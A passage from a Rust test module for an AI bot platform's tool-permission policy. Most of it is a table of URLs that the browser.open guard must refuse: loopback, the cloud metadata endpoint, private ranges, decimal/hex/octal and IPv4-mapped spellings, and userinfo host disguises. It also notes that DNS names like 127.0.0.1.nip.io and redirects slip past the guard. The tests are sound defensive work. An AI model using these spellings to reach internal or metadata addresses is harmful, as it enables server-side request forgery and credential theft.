            "a credential request costs two prompts"
        );
        // Not a blanket exemption: an unknown tool still meets the fallback.
        assert!(matches!(
            Policy::default().evaluate("something.new", &json!({})),
            Verdict::Ask(_)
        ));
    }

    /// An operator's own rule still governs it, in both directions.
    ///
    /// This is why the default is a rule rather than a carve-out in the
    /// enforcement path: precedence already handles disagreement, and a rule
    /// is visible in `botroster policy ls`.
    #[test]
    fn an_operators_own_rule_still_governs_credential_requests() {
        let mut p = Policy::default();
        p.rules.push(Rule::ask(
            "secret.request",
            "this Bot must not collect tokens",
        ));
        assert!(
            matches!(p.evaluate("secret.request", &json!({})), Verdict::Ask(r) if r.contains("must not collect")),
            "an operator's `ask` did not outrank the shipped allow"
        );

        let mut p = Policy::default();
        p.rules
            .push(Rule::deny("secret.request", "no credentials from this Bot"));
        assert!(
            matches!(p.evaluate("secret.request", &json!({})), Verdict::Deny(_)),
            "an operator's `deny` did not beat the shipped allow"
        );
    }

    // ── browser.open and private destinations ──
    //
    // Every case here is one spelling that reaches a non-public address. They
    // are written as a table rather than a dozen near-identical tests because
    // the failure mode is a *missed spelling*: the obvious `127.0.0.1` works,
    // someone writes `2130706433`, and the guard passes a URL it thought it had
    // stopped. A table makes the whole set readable in one place, so adding a
    // spelling to the list is the easy move.
    fn refuses(url: &str) -> String {
        let p = Policy::default();
        match p.evaluate("browser.open", &json!({ "url": url })) {
            Verdict::Deny(why) => why,
            other => panic!("{url} was not refused: {other:?}"),
        }
    }

    fn asks(url: &str) -> bool {
        let p = Policy::default();
        !matches!(
            p.evaluate("browser.open", &json!({ "url": url })),
            Verdict::Deny(_)
        )
    }

    /// Loopback, in every spelling the parser hands back as an address and in both
    /// names RFC 6761 reserves for it.
    ///
    /// `127.1.2.3` is here because the `url` crate normalises it to an address
    /// rather than leaving it as a name, and a guard written against
    /// `starts_with("127.")` would miss it.
    #[test]
    fn loopback_is_refused_in_every_spelling() {
        for url in [
            "http://127.0.0.1/",
            "http://127.0.0.1:8443/v1/tools",
            "http://127.1.2.3/",
            "http://[::1]/",
            "http://[0:0:0:0:0:0:0:1]/",
            "http://localhost/",
            "http://LOCALHOST/",
            "http://foo.localhost/",
            // The trailing dot is a distinct spelling, and the url crate keeps
            // it: `http://localhost./` parses as the *name* `localhost.`, not as
            // `localhost`. A name comparison that does not strip it lets this
            // through, and it is the same host.
            "http://localhost./",
        ] {
            let why = refuses(url);
            assert!(
                why.contains("loopback"),
                "{url} was refused without saying it was loopback: {why}"
            );
        }
    }

    /// The unspecified address, which is loopback's neighbour and not the same
    /// thing.
    ///
    /// Separate because naming it correctly matters: `0.0.0.0` means "this host"
    /// to a listener and is refused as the unspecified address, and the first
    /// draft of this test asserted the word "loopback" for every entry in a list
    /// that included it. The code was right and the assertion was wrong, which is
    /// the only acceptable direction for that mistake.
    #[test]
    fn the_unspecified_address_is_refused() {
        for url in ["http://0.0.0.0/", "http://0/"] {
            let why = refuses(url);
            assert!(
                why.contains("unspecified"),
                "{url} was refused without naming itself correctly: {why}"
            );
        }
    }

    /// Link-local, including the cloud metadata address on both stacks.
    #[test]
    fn link_local_and_metadata_addresses_are_refused() {
        for url in [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.0.1/",
            "http://[fe80::1]/",
            // AWS's IPv6 metadata endpoint. It is inside fc00::/7, so it is
            // refused by the unique-local rule rather than by a special case,
            // and this test is what says so.
            "http://[fd00:ec2::254]/",
        ] {
            let why = refuses(url);
            assert!(
                !why.is_empty(),
                "{url} was refused without saying which range it was in"
            );
        }
    }

    /// RFC1918 and unique-local.
    #[test]
    fn private_ranges_are_refused() {
        for url in [
            "http://10.0.0.1/",
            "http://10.255.255.255/",
            // 172.16.0.0/12 is 172.16 through 172.31, and NOT 172.32. The two
            // neighbouring addresses are here because that boundary is exactly
            // the sort of thing an off-by-one in a range check produces.
            "http://172.16.0.1/",
            "http://172.31.255.255/",
            "http://192.168.1.1/",
            "http://[fc00::1]/",
            "http://[fd00::1]/",
        ] {
            refuses(url);
        }
        // Just outside every one of them, and public.
        for url in [
            "http://172.15.0.1/",
            "http://172.32.0.1/",
            "http://9.255.255.255/",
        ] {
            assert!(asks(url), "{url} is public and was refused");
        }
    }

    /// An IPv4-mapped IPv6 address is the same address.
    ///
    /// `[::ffff:127.0.0.1]` and `[::ffff:10.0.0.1]` are how a dual-stack client
    /// writes a v4 destination, and a v6-only range check would pass them.
    #[test]
    fn an_ipv4_mapped_ipv6_address_is_refused() {
        refuses("http://[::ffff:127.0.0.1]/");
        refuses("http://[::ffff:10.0.0.1]/");
        refuses("http://[::ffff:169.254.169.254]/");
        // And the mapped form of a public address is still public.
        assert!(
            asks("http://[::ffff:93.184.216.34]/"),
            "the mapped form of a public address was refused"
        );
    }

    /// Decimal, hexadecimal and octal IPv4, which the `url` crate resolves to
    /// addresses before this code ever sees them.
    ///
    /// The first three are all `127.0.0.1`. A guard that read the host as a
    /// string and looked for "127." would pass all three.
    ///
    /// The decimal constants are computed, not guessed: `10.0.0.1` is
    /// `10*16777216 + 1` = `167772161`, and `169.254.169.254` is
    /// `169*16777216 + 254*65536 + 169*256 + 254` = `2852039166`. The first
    /// draft of this test used `282475776`, which is `16.214.61.0` and public, so
    /// it failed - correctly, since a wrong constant here would have been a
    /// private address asserted public, which is the shape of mistake that makes
    /// this table worthless.
    #[test]
    fn decimal_hex_and_octal_ipv4_spellings_are_refused() {
        for url in [
            "http://2130706433/",
            "http://0x7f.1/",
            "http://017700000001/",
            // A private address in all three notations.
            "http://167772161/",
            "http://0x0a000001/",
            "http://0x0a.0.0.1/",
            // And the metadata address in decimal and hex.
            "http://2852039166/",
            "http://0xa9fea9fe/",
        ] {
            refuses(url);
        }
        // A decimal number that is a public address still asks, which is what
        // makes the refusal above about the address rather than the notation.
        assert!(
            asks("http://134744072/"),
            "example.com's address was refused"
        );
    }

    /// Userinfo cannot smuggle the host past the check.
    ///
    /// `http://allowed.example@127.0.0.1/` looks at a glance like a request to
    /// `allowed.example`, and it is not: everything before the `@` is
    /// credentials. The `url` crate drops the userinfo when it hands back the
    /// host, so this passes only if the host is read as a `Host` rather than
    /// picked out of the string.
    #[test]
    fn userinfo_cannot_disguise_a_private_address() {
        refuses("http://allowed.example@127.0.0.1/");
        refuses("http://user:pass@169.254.169.254/");
        refuses("http://example.com@10.0.0.1/");
        // And the reason is the real one rather than a generic refusal, which is
        // what says the host was read as an address and not as the name in front
        // of the `@`.
        let why = refuses("http://allowed.example@127.0.0.1/");
        assert!(
            why.contains("loopback"),
            "the refusal did not identify the address behind the userinfo: {why}"
        );
    }

    /// The public internet still asks, which is the whole point of scoping the
    /// refusal rather than refusing `browser.open`.
    #[test]
    fn a_public_address_still_asks() {
        for url in [
            "http://93.184.216.34/",
            "https://example.com/",
            "https://example.com:8443/path?q=1",
        ] {
            assert!(asks(url), "{url} is public and was refused");
        }
    }

    /// The refusal is a refusal: no rule and no grant lifts it.
    #[test]
    fn no_grant_lifts_the_private_address_refusal() {
        let mut p = Policy::default();
        // An operator's blanket allow, and a session grant for the exact origin.
        p.rules.push(Rule::allow("browser.open"));
        p.grants
            .insert(origin_grant_key("browser.open", "http://127.0.0.1:80"));
        p.grants.insert("browser.open".to_owned());
        assert!(
            matches!(
                p.evaluate("browser.open", &json!({ "url": "http://127.0.0.1/" })),
                Verdict::Deny(_)
            ),
            "a grant lifted the private-address refusal, which is the one thing it \
             must not do"
        );
    }

    /// The opt-in lifts the refusal but not the approval.
    #[test]
    fn the_config_line_lifts_the_refusal_and_still_asks() {
        let p = Policy::allowing_private_browser_destinations();
        assert!(
            matches!(
                p.evaluate("browser.open", &json!({ "url": "http://127.0.0.1/" })),
                Verdict::Ask(_)
            ),
            "with the refusal lifted, a loopback fetch should still cost one approval"
        );
        // A public URL is unaffected either way.
        assert!(matches!(
            p.evaluate("browser.open", &json!({ "url": "https://example.com/" })),
            Verdict::Ask(_)
        ));
    }

    /// Only `browser.open` is affected.
    ///
    /// Scoped by name rather than by "has a url argument", so a tool added later
    /// with a `url` field does not silently inherit a refusal nobody decided on.
    #[test]
    fn only_browser_open_is_refused() {
        let p = Policy::default();
        assert!(
            !matches!(
                p.evaluate(
                    "fs.read",
                    &json!({ "path": "notes.md", "url": "http://127.0.0.1/" })
                ),
                Verdict::Deny(_)
            ),
            "a tool that merely carries a `url` field inherited the browser refusal"
        );
    }

    /// Fail closed by asking, never by refusing.
    ///
    /// An unparseable URL and a non-http scheme get no verdict from the matcher,
    /// so they fall through to the normal gate and cost one approval. Refusing
    /// them would be tidier and wrong: this code cannot tell a malformed URL from
    /// a scheme it has not been taught, and guessing "that is a private address"
    /// would make `file://` and `data:` a refusal with a misleading reason.
    #[test]
    fn an_unparseable_url_keeps_asking() {
        let p = Policy::default();
        for url in ["not a url", "", "http://", "ht!tp://127.0.0.1"] {
            assert!(
                !matches!(
                    p.evaluate("browser.open", &json!({ "url": url })),
                    Verdict::Deny(_)
                ),
                "{url:?} was refused rather than asked; an unparseable URL must cost \
                 an approval"
            );
        }
        // And with no url at all.
        assert!(!matches!(
            p.evaluate("browser.open", &json!({})),
            Verdict::Deny(_)
        ));
    }

    /// What this does not cover, asserted so the gap is a test rather than a
    /// caveat in prose somebody skips.
    ///
    /// A name is not an address. `127.0.0.1.nip.io` resolves to loopback and is
    /// a `Host::Domain` here, so it asks; and a redirect from an approved public
    /// origin to a private one is invisible to any check on the requested URL.
    /// Both need an egress filter in front of the browser.
    #[test]
    fn a_name_that_resolves_to_a_private_address_still_asks() {
        assert!(
            asks("http://127.0.0.1.nip.io/"),
            "this test exists to document that DNS is not resolved here; if it ever \
             fails, something started resolving names and the comment above it needs \
             rewriting"
        );
    }

    /// The opt-in is off unless the variable is exactly `1`.
    #[test]
    fn the_config_line_is_explicit() {
        // Set in-process rather than through the environment so the test does not
        // depend on, or disturb, the runner's own environment.
        assert!(
            !Policy::default().allow_private_browser_destinations,
            "the shipped default allows private destinations"
        );
    }
}
